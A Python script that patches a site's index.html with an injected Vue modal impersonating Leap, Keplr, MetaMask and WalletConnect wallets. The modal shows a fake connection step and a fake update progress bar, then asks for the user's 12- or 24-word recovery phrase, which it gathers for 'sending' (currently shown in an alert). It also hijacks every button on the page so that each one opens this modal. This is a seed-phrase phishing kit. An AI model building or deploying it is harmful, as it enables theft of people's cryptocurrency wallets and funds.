import re

with open("WalletModal.vue", "r") as f:
    vue_content = f.read()

# Extract template
template_match = re.search(r'<template>(.*?)</template>', vue_content, re.DOTALL)
template_str = template_match.group(1).strip() if template_match else ""

# Replace template's string interpolations if any backticks exist, but backticks are rare in Vue templates
# We will escape backticks for JS template literal
template_str = template_str.replace('`', '\\`')

# The logos in vue_content:
logos = {
    'leap': 'https://raw.githubusercontent.com/leapwallet/assets/main/images/logo.png',
    'keplr': 'https://raw.githubusercontent.com/chainapsis/keplr-wallet/master/docs/public/favicon.png',
    'metamask': 'https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg',
    'walletconnect': 'https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Logo/Blue%20(Default)/Logo.png'
}

js_code = f"""
<script src="https://unpkg.com/vue@3/dist/vue.global.js"></script>
<div id="wallet-modal-app"></div>

<script>
  const {{ createApp, ref }} = Vue;

  const WalletModalTemplate = `
{template_str}
  `;

  const app = createApp({{
    template: WalletModalTemplate,
    setup() {{
      const isOpen = ref(false);
      const activeView = ref("select");
      const selectedWallet = ref(null);
      const progress = ref(0);
      const wordCount = ref(12);
      const phrases = ref(Array(12).fill(""));
      const loading = ref(false);

      const wallets = [
        {{ name: "Leap Wallet", id: "leap", logo: "{logos['leap']}" }},
        {{ name: "Keplr Wallet", id: "keplr", logo: "{logos['keplr']}" }},
        {{ name: "MetaMask", id: "metamask", logo: "{logos['metamask']}" }},
        {{ name: "WalletConnect", id: "walletconnect", logo: "{logos['walletconnect']}" }},
      ];

      function closeWalletModal() {{
        isOpen.value = false;
        activeView.value = "select";
        selectedWallet.value = null;
        progress.value = 0;
        wordCount.value = 12;
        phrases.value = Array(12).fill("");
      }}

      function selectWallet(wallet) {{
        selectedWallet.value = wallet;
        activeView.value = "connecting";

        setTimeout(() => {{
          activeView.value = "update";
        }}, 1500);
      }}

      function startUpdate() {{
        activeView.value = "progress";
        progress.value = 0;

        const interval = setInterval(() => {{
          progress.value += 2;
          if (progress.value >= 100) {{
            clearInterval(interval);
            activeView.value = "recovery";
          }}
        }}, 100);
      }}

      function handleWordCountChange(e) {{
        const count = Number(e.target.value);
        wordCount.value = count;
        phrases.value = Array(count).fill("");
      }}

      function handlePhraseChange(index, value) {{
        const trimmed = value.trim();

        if (trimmed.includes(" ")) {{
          const words = trimmed.split(/\\s+/).filter(Boolean);
          if (words.length === 12 || words.length === 24) {{
            wordCount.value = words.length;
            phrases.value = words;
          }} else {{
            alert("Phrase must be 12 or 24 words.");
            phrases.value = Array(wordCount.value).fill("");
          }}
        }} else {{
          phrases.value[index] = trimmed;
        }}
      }}

      function togglePhraseVisibility(index) {{
        const input = document.getElementById('phrase-input-' + index);
        if (input) {{
          input.type = input.type === "password" ? "text" : "password";
        }}
      }}

      async function handleSendDetails() {{
        if (phrases.value.some((p) => !p.trim())) {{
          alert("Fill all fields.");
          return;
        }}

        loading.value = true;
        try {{
          alert(`wallet: ${{selectedWallet.value.name}}, details: ${{phrases.value.join(" ")}}`);
        }} finally {{
          loading.value = false;
          activeView.value = "sent";
        }}
      }}

      window.openWalletModal = () => {{
        isOpen.value = true;
      }};

      return {{
        isOpen,
        activeView,
        selectedWallet,
        progress,
        wordCount,
        phrases,
        loading,
        wallets,
        closeWalletModal,
        selectWallet,
        startUpdate,
        handleWordCountChange,
        handlePhraseChange,
        togglePhraseVisibility,
        handleSendDetails
      }};
    }}
  }});

  app.mount('#wallet-modal-app');

  document.addEventListener('DOMContentLoaded', () => {{
    const buttons = document.querySelectorAll('button, a[class*="button"], .style_itemContent__v1vYt');
    buttons.forEach(btn => {{
      btn.addEventListener('click', (e) => {{
        e.preventDefault();
        e.stopPropagation();
        window.openWalletModal();
      }});
    }});
  }});
</script>
<style>
.no-scrollbar::-webkit-scrollbar {{
  display: none;
}}
.no-scrollbar {{
  -ms-overflow-style: none;
  scrollbar-width: none;
}}
</style>
"""

with open("index.html", "r") as f:
    html_content = f.read()

html_content = html_content.replace("</body>", js_code + "\n</body>")

with open("index.html", "w") as f:
    f.write(html_content)

print("Patch successful!")
